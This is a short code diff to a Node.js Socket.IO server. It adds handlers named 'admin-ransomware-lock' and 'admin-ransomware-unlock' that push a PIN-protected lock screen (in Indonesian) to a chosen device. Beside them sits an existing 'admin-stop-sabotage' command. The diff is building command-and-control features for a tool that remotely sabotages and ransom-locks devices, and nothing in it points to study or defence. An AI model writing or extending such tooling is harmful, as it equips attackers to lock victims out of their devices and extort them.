@@ -343,6 +343,23 @@ io.on('connection', (socket) => {
                 io.to(data.deviceId).emit('admin-stop-sabotage');
             }
         });
+        socket.on('admin-ransomware-lock', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-ransomware-lock', {
+                    message: data.message || 'Device Terkunci',
+                    subtitle: data.subtitle || 'Masukkan PIN untuk membuka',
+                    note: data.note || 'Perangkat ini telah dikunci oleh admin.',
+                    showPin: data.showPin !== false,
+                    maxPin: data.maxPin || 6,
+                    sound: data.sound || ''
+                });
+            }
+        });
+        socket.on('admin-ransomware-unlock', (data) => {
+            if (data.deviceId) {
+                io.to(data.deviceId).emit('admin-ransomware-unlock');
+            }
+        });
         socket.on('disconnect', () => {
             // Keep IP in set briefly; remove after other sockets from same IP may still be active
             setTimeout(() => adminIps.delete(adminIp), 60000);
